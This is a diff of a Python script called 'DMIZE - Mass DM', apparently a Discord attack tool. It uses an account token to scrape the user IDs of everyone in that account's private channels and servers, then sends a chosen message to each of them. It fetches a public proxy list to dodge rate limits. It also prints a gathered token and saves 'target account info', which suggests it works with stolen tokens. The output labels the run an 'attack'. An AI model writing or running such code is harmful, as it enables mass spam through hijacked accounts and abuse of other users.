@@ -1,5 +1,4 @@
-import os, re, json, requests,datetime, colorama, base64, subprocess, importlib,urllib.request, urllib.error;from colorama import *;from urllib.request import Request, urlopen;from Crypto.Cipher import AES;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from json import dumps, loads as json_loads, load
-header,requests_url,modules, missing_modules,proxy_list,id_list, guild_list,guild_scrap,channel_scrap,user_scrap,message_sent=modules = { 'Cookie': '__dcfduid=30b25b30bdb811eca9acdd9d360ada08','Content-Type': 'application/json','x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImZyLUZSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL2Rpc2NvcmQuY29tLyIsInJlZmVycmluZ19kb21haW4iOiJkaXNjb3JkLmNvbSIsInJlZmVycmVyX2N1cnJlbnQiOiJodHRwczovL2Rpc2NvcmQuY29tLyIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6ImRpc2NvcmQuY29tIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTYwNjQ1LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=='},{'proxies' : 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt','ip' : "http://ipinfo.io/json",'user' : 'https://discord.com/api/v6/users/@me','private_channel' : "https://discord.com/api/v9/users/@me/channels",'guild' : "https://discord.com/api/v9/users/@me/guilds",'guild_channel' : 'https://discord.com/api/v8/guilds/{guild_id}/channels','channel_content' : 'https://discord.com/api/v8/channels/{channel_id}/messages','message' : 'https://discord.com/api/v9/channels/{id}/messages','up_channel' : 'https://discord.com/api/v8/users/@me/channels'},['urllib.request','Crypto.Cipher','ctypes','json','colorama'],[],[],[],[],0,0,0,0
+import os, re, json, requests,datetime, colorama, base64, subprocess, importlib,urllib.request, urllib.error;from colorama import *;from urllib.request import Request, urlopen;from Crypto.Cipher import AES;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from json import dumps, loads as json_loads, load;header,requests_url,modules, missing_modules,proxy_list,id_list, guild_list,guild_scrap,channel_scrap,user_scrap,message_sent=modules = { 'Cookie': '__dcfduid=30b25b30bdb811eca9acdd9d360ada08','Content-Type': 'application/json','x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImZyLUZSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL2Rpc2NvcmQuY29tLyIsInJlZmVycmluZ19kb21haW4iOiJkaXNjb3JkLmNvbSIsInJlZmVycmVyX2N1cnJlbnQiOiJodHRwczovL2Rpc2NvcmQuY29tLyIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6ImRpc2NvcmQuY29tIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTYwNjQ1LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=='},{'proxies' : 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt','ip' : "http://ipinfo.io/json",'user' : 'https://discord.com/api/v6/users/@me','private_channel' : "https://discord.com/api/v9/users/@me/channels",'guild' : "https://discord.com/api/v9/users/@me/guilds",'guild_channel' : 'https://discord.com/api/v8/guilds/{guild_id}/channels','channel_content' : 'https://discord.com/api/v8/channels/{channel_id}/messages','message' : 'https://discord.com/api/v9/channels/{id}/messages','up_channel' : 'https://discord.com/api/v8/users/@me/channels'},['urllib.request','Crypto.Cipher','ctypes','json','colorama'],[],[],[],[],0,0,0,0
 
 def gather_modules():
     #in maintenance
@@ -97,52 +96,47 @@ def check_token(token):
     if requests.get(requests_url['user'], headers=getheaders(token)).status_code == 200:pass
     else:print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.RED} Wrong token !');input();exit()
 def Mass_Dm():  
-    global guild_scrap,channel_scrap,user_scrap,message_sent
-    #still in dev
     def gather_private_channel():
         return requests.get(requests_url['up_channel'], headers=getheaders(token)).json()
     def append_private():
-        for conv in gather_private_channel():id_list.append(int(conv["id"]))
-    def gather_guilds():
+        for conv in gather_private_channel():id_list.append(f'{int(conv["id"])}')
+    def gather_user_guilds():
         return requests.get(requests_url['guild'], headers=getheaders(token)).json()
-    def append_guilds_id():
-        for guilds in gather_guilds(): guild_list.append(int(guilds["id"]))
-    def gather_guild_channels(guild_id):
-        return requests.get(requests_url['guild_channel'].format(guild_id=guild_id),headers=getheaders(token)).json()
-    def gather_channels_content(channel_id):
-        return requests.get(requests_url['channel_content'].format(channel_id=channel_id), headers=getheaders(token)).json()
-    def send_content(channel_id, content):
-        header.update({"Authorization": token})
-        return requests.post(requests_url['message'].format(id=channel_id), json={'content': content}, headers=header).status_code
-    def send_private_message(id, content):
-        try:
-            status_code = send_content(id, content)
-            if status_code == 200:message_sent += 1
-        except :pass
-    def gather_channel_id(_id_):
-        header.update({"Authorization": token})
-        return requests.post(requests_url['up_channel'],json={'recipients': [_id_]},headers=header).json()["id"]
-    def create_private_channel(_id_):
-        send_private_message(content=content ,id=gather_channel_id(_id_))
-    def append_guilds():
-        append_guilds_id()
-        for guild_id in guild_list:
-            guild_scrap = len(guild_list)
-            for channel in gather_guild_channels(guild_id):
-                channel_scrap = len(gather_guild_channels(guild_id))
-                for message in gather_channels_content(channel_id=channel['id']):
-                    try:
-                        if message['author']['id'] not in id_list:id_list.append(message['author']['id']);user_scrap += 1
-                    except: pass
-    def gather_ids():
-        append_private()
-        append_guilds()
+    def gather_guilds_channel(id_guild):
+        return requests.get(requests_url['guild_channel'].format(guild_id=id_guild), headers=getheaders(token)).json()
+    def gather_activ_user_id(id_channel):
+        return requests.get(requests_url['channel_content'].format(channel_id=id_channel), headers=getheaders(token)).json()
+    def return_header(token):
+        header.update({"Authorization": token});return header
+    def gather_id_guild_list():
+        for chanel in gather_user_guilds():   
+            for elr in gather_guilds_channel(id_guild=chanel['id']):
+                for message in gather_activ_user_id(id_channel=elr['id']):          
+                    try :
+                        if message['author']['id'] not in id_list: id_list.append(f"{message['author']['id']}")
+                    except:pass   
+    def gather_id_list():
+        append_private();gather_id_guild_list();return id_list
+        
+    def gather_new_thread(iid):
+        return requests.post(requests_url['private_channel'], headers=return_header(token), json={'recipients': [iid]}).json()["id"]  
+    def send_thread(iid):
+        return requests.post(requests_url['message'].format(id=gather_new_thread(iid)),data={"content": f'{content}'},headers={'Authorization': token}).status_code
     def DMIZE():
-        gather_ids()
-        for _id_ in id_list:
-            create_private_channel(_id_)
-            exit()
-
+        for iid in gather_id_list(): 
+            try:
+                if send_thread(iid) == 200: print('send')
+            except: pass
+    DMIZE()
+   
+def main():
+    global token , content
+    set_console_title(f'DMIZE - Mass DM | connect as {gather_discord_username(token=gather_token())} : {gather_discord_phone(token=gather_token())}')
+    #in maintenance "gather_modules()"
+    print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.YELLOW}WARNING   {Fore.MAGENTA} acces.point.gateway {Fore.WHITE} Proxies could be add if the hoster IP get rate limit {gather_ip()}.')
+    print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.BLUE}INFO      {Fore.MAGENTA} autorization.user {Fore.WHITE} logging in using static token {gather_token()}.')
+    print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.BLUE}INFO      {Fore.MAGENTA} login.user {Fore.WHITE} Session connect on {gather_user()}')
+    print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.RED}SCRAPING  {Fore.MAGENTA} update.gateway {Fore.WHITE} Scraping proxies to avoid rate limit risk -> Proxies scrap =  {gather_proxy()}')
     token = input(f'{Fore.LIGHTBLACK_EX}{used()} {input_prompt()}{Fore.WHITE} Enter Token to MassDm :')
     check_token(token=token)
     print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Sucessfully log into {gather_discord_username(token=token)}')
@@ -150,15 +144,6 @@ def Mass_Dm():
     print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Target account info upload to {Fore.RED}{gather_discord_username(token=token)}.json{Fore.RED}')
     content = input(f'{Fore.LIGHTBLACK_EX}{used()} {input_prompt()}{Fore.WHITE} Enter the message to sent trough {Fore.RED}{gather_discord_username(token=token)}{Fore.RED}{Fore.WHITE} account :')
     input(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Enter to start the attack ...')
-    DMIZE()
-   
-def main():
-    set_console_title(f'DMIZE - Mass DM | connect as {gather_discord_username(token=gather_token())} : {gather_discord_phone(token=gather_token())}')
-    #in maintenance "gather_modules()"
-    print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.YELLOW}WARNING   {Fore.MAGENTA} acces.point.gateway {Fore.WHITE} Proxies could be add if the hoster IP get rate limit {gather_ip()}.')
-    print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.BLUE}INFO      {Fore.MAGENTA} autorization.user {Fore.WHITE} logging in using static token {gather_token()}.')
-    print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.BLUE}INFO      {Fore.MAGENTA} login.user {Fore.WHITE} Session connect on {gather_user()}')
-    print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.RED}SCRAPING  {Fore.MAGENTA} update.gateway {Fore.WHITE} Scraping proxies to avoid rate limit risk -> Proxies scrap =  {gather_proxy()}')
     Mass_Dm()
     print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Attack finish')
     print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Final Stats -> {Fore.GREEN}guild scrap{Fore.WHITE} : {Fore.LIGHTRED_EX}{guild_scrap}{Fore.WHITE} | {Fore.GREEN}channel scrap{Fore.WHITE} : {Fore.LIGHTRED_EX}{channel_scrap}{Fore.WHITE} | {Fore.GREEN}user scrap{Fore.WHITE} : {Fore.LIGHTRED_EX}{user_scrap}{Fore.WHITE} | {Fore.GREEN}message sent {Fore.WHITE} : {Fore.LIGHTRED_EX}{message_sent}{Fore.WHITE}')
